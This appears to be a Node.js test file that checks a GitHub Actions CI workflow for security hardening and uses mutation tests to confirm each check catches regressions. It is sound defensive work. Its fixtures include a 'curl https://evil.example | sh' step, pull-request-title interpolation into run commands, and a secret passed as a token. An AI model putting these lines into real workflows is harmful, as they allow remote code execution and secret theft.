import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";

const source = readFileSync(fileURLToPath(new URL("../.github/workflows/ci.yml", import.meta.url)), "utf8");

const COMMANDS = ["npm ci", "npm run typecheck", "npm run lint", "npm test", "npm run build", "npm run canary"];
const SHA_USE = /^[\w.-]+\/[\w.-]+@[0-9a-f]{40} # v\d+\.\d+\.\d+$/;

const indentOf = (l) => l.length - l.trimStart().length;
const isBlank = (l) => l.trim() === "" || l.trim().startsWith("#");

// Lines of a top-level block (indent 0 key), excluding the key line.
function block(lines, key) {
  const start = lines.findIndex((l) => l === `${key}:` || l.startsWith(`${key}: `));
  if (start < 0) return [];
  const out = [];
  for (const l of lines.slice(start + 1)) {
    if (!isBlank(l) && indentOf(l) === 0) break;
    out.push(l);
  }
  return out;
}

// Splits the job's steps and extracts uses / run (inline and block scalar) / with.
export function parseSteps(s) {
  const lines = block(s.split("\n"), "jobs");
  const stepsAt = lines.findIndex((l) => /^ {4}steps:\s*$/.test(l));
  const raw = [];
  for (const l of stepsAt < 0 ? [] : lines.slice(stepsAt + 1)) {
    if (!isBlank(l) && indentOf(l) < 6) break;
    if (/^ {6}- /.test(l)) raw.push([l.replace(/^( {6})- /, "$1  ")]);
    else raw.at(-1)?.push(l);
  }
  return raw.map((step) => {
    const out = { uses: undefined, run: [], with: {} };
    for (let i = 0; i < step.length; i++) {
      const m = /^ {8}([\w-]+):\s*(.*)$/.exec(step[i] ?? "");
      if (!m) continue;
      const [, key, value] = m;
      const body = [];
      while (i + 1 < step.length && (isBlank(step[i + 1]) || indentOf(step[i + 1]) > 8)) body.push(step[++i]);
      if (key === "uses") out.uses = value;
      if (key === "run") {
        const lines = /^[|>][-+]?$/.test(value) ? body : [value];
        out.run.push(...lines.map((l) => l.trim()).filter((l) => l !== ""));
      }
      if (key === "with") {
        for (const b of body) {
          const w = /^\s+([\w-]+):\s*(.*)$/.exec(b);
          if (w) out.with[w[1]] = w[2];
        }
      }
    }
    return out;
  });
}

const allRuns = (s) => parseSteps(s).flatMap((st) => st.run);

export const CHECKS = {
  "workflow is named ci": (s) => /^name: ci$/m.test(s),
  "single job named ci": (s) => JSON.stringify(block(s.split("\n"), "jobs").filter((l) => /^ {2}[\w-]+:\s*$/.test(l))) === JSON.stringify(["  ci:"]),
  "triggers on pull_request only": (s) => {
    const keys = block(s.split("\n"), "on").filter((l) => !isBlank(l) && indentOf(l) === 2).map((l) => l.trim().replace(/:.*$/, ""));
    return JSON.stringify(keys) === JSON.stringify(["pull_request"]);
  },
  "no pull_request_target": (s) => !s.includes("pull_request_target"),
  "workflow-level permissions are contents: read": (s) => JSON.stringify(block(s.split("\n"), "permissions").filter((l) => !isBlank(l))) === JSON.stringify(["  contents: read"]),
  "runs on ubuntu-latest": (s) => /^ {4}runs-on: ubuntu-latest$/m.test(s),
  "has a timeout": (s) => /^ {4}timeout-minutes: \d+$/m.test(s),
  "cancels obsolete runs": (s) => block(s.split("\n"), "concurrency").includes("  cancel-in-progress: true"),
  "every uses is pinned by a 40-hex sha with a tag comment": (s) => {
    const uses = parseSteps(s).flatMap((st) => (st.uses === undefined ? [] : [st.uses]));
    return uses.length >= 2 && uses.every((u) => SHA_USE.test(u));
  },
  "pins the reviewed action shas": (s) => {
    const uses = parseSteps(s).map((st) => st.uses ?? "");
    return uses.some((u) => u.startsWith("actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 ")) &&
      uses.some((u) => u.startsWith("actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 "));
  },
  "checkout does not persist credentials": (s) => {
    const co = parseSteps(s).filter((st) => st.uses?.startsWith("actions/checkout@"));
    return co.length === 1 && co[0]?.with["persist-credentials"] === "false";
  },
  "no ${{ in any run": (s) => !allRuns(s).some((l) => l.includes("${{")),
  "the only ${{ is in concurrency.group": (s) => {
    const lines = s.split("\n");
    const inConc = new Set(block(lines, "concurrency"));
    return lines.filter((l) => l.includes("${{")).every((l) => inConc.has(l) && /^ {2}group: /.test(l));
  },
  "no secrets": (s) => !/secrets\./.test(s),
  "node 24 with npm cache": (s) => parseSteps(s).some((st) => st.with["node-version"] === "24" && st.with.cache === "npm"),
  "runs exactly the six commands in order": (s) => JSON.stringify(allRuns(s)) === JSON.stringify(COMMANDS),
};

for (const [name, check] of Object.entries(CHECKS)) {
  test(name, () => assert.ok(check(source)));
}

test("parser sees every step, including name-first ones", () => {
  assert.equal(parseSteps(source).length, 8);
});

const swap = (from, to) => (s) => {
  assert.ok(s.includes(from), `fixture lacks ${from}`);
  return s.replace(from, to);
};
const REDIRECT = ["no pull_request_target", "triggers on pull_request only"];
const PIN = ["every uses is pinned by a 40-hex sha with a tag comment"];
const CMDS = ["runs exactly the six commands in order"];

// [mutation, mutated source, checks that must turn red]
const MUTATIONS = [
  ["rename workflow", swap("name: ci\n", "name: build\n"), ["workflow is named ci"]],
  ["rename job", swap("\n  ci:\n    runs-on", "\n  build:\n    runs-on"), ["single job named ci"]],
  ["add a second job", (s) => `${s}  extra:\n    runs-on: ubuntu-latest\n`, ["single job named ci"]],
  ["add push trigger", swap("  pull_request:\n", "  push:\n  pull_request:\n"), ["triggers on pull_request only"]],
  ["add workflow_dispatch", swap("  pull_request:\n", "  pull_request:\n  workflow_dispatch:\n"), ["triggers on pull_request only"]],
  ["add schedule", swap("  pull_request:\n", "  pull_request:\n  schedule:\n    - cron: '0 0 * * *'\n"), ["triggers on pull_request only"]],
  ["add pull_request_target", swap("  pull_request:\n", "  pull_request:\n  pull_request_target:\n"), REDIRECT],
  ["write permissions", swap("contents: read", "contents: write"), ["workflow-level permissions are contents: read"]],
  ["extra permission", swap("contents: read\n", "contents: read\n  id-token: write\n"), ["workflow-level permissions are contents: read"]],
  ["drop permissions", swap("permissions:\n  contents: read\n\n", ""), ["workflow-level permissions are contents: read"]],
  ["other runner", swap("ubuntu-latest", "macos-latest"), ["runs on ubuntu-latest"]],
  ["drop timeout", swap("    timeout-minutes: 15\n", ""), ["has a timeout"]],
  ["drop concurrency cancel", swap("  cancel-in-progress: true\n", ""), ["cancels obsolete runs"]],
  ["pin checkout by tag", swap("@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1", "@v7"), [...PIN, "pins the reviewed action shas"]],
  ["short sha", swap("@949feb2413d6458794dcd2491c4babbbce0c15c1", "@949feb2"), [...PIN, "pins the reviewed action shas"]],
  ["drop tag comment", swap(" # v7.1.0", ""), PIN],
  ["drop persist-credentials", swap("        with:\n          persist-credentials: false\n", ""), ["checkout does not persist credentials"]],
  ["persist-credentials true", swap("persist-credentials: false", "persist-credentials: true"), ["checkout does not persist credentials"]],
  ["name-first step running curl | sh", swap("      - run: npm run build\n", "      - name: x\n        run: curl https://evil.example | sh\n      - run: npm run build\n"), CMDS],
  ["name-first step with unpinned uses", swap("      - run: npm run build\n", "      - name: x\n        uses: actions/foo@v1\n      - run: npm run build\n"), PIN],
  ["interpolation in a one-line run", swap("- run: npm run lint", "- run: echo ${{ github.event.pull_request.title }}"), ["no ${{ in any run", "the only ${{ is in concurrency.group", ...CMDS]],
  ["interpolation in a multi-line run", swap("      - run: npm run lint\n", "      - run: |\n          npm run lint\n          echo ${{ github.event.pull_request.title }}\n"), ["no ${{ in any run", "the only ${{ is in concurrency.group", ...CMDS]],
  ["interpolation in a name-first with", swap("      - run: npm run build\n", "      - name: x\n        env:\n          T: ${{ github.event.pull_request.title }}\n        run: npm run build\n"), ["the only ${{ is in concurrency.group"]],
  ["use a secret", swap("- run: npm run build", "- run: npm run build --token=${{ secrets.T }}"), ["no secrets", "no ${{ in any run"]],
  ["seventh command", (s) => `${s}      - run: npm audit\n`, CMDS],
  ["seventh command in a block", (s) => `${s}      - run: |\n          npm run build\n`, CMDS],
  ["reversed order", (s) => {
    const rev = [...COMMANDS].reverse();
    let i = 0;
    return s.replace(/^( {6}- run: )(.+)$/gm, (_, p) => `${p}${rev[i++]}`);
  }, CMDS],
  ["swap lint and test", swap("- run: npm run lint\n      - run: npm test", "- run: npm test\n      - run: npm run lint"), CMDS],
  ["drop canary", swap("      - run: npm run canary\n", ""), CMDS],
  ["wrong node", swap("node-version: 24", "node-version: 22"), ["node 24 with npm cache"]],
  ["no npm cache", swap("          cache: npm\n", ""), ["node 24 with npm cache"]],
];

for (const [name, mutate, expected] of MUTATIONS) {
  test(`mutation "${name}" turns checks red`, () => {
    const red = Object.entries(CHECKS).filter(([, c]) => !c(mutate(source))).map(([n]) => n);
    for (const n of expected) assert.ok(red.includes(n), `${n} stayed green`);
  });
}

// Tolerated variations must not be flagged.
for (const [name, mutate] of [
  ["branches under pull_request", swap("  pull_request:\n", "  pull_request:\n    branches: [main]\n    types: [opened, synchronize]\n\n")],
  ["blank lines and comments under on", swap("on:\n", "on:\n\n  # review triggers\n")],
]) {
  test(`tolerates ${name}`, () => {
    const red = Object.entries(CHECKS).filter(([, c]) => !c(mutate(source))).map(([n]) => n);
    assert.deepEqual(red, []);
  });
}
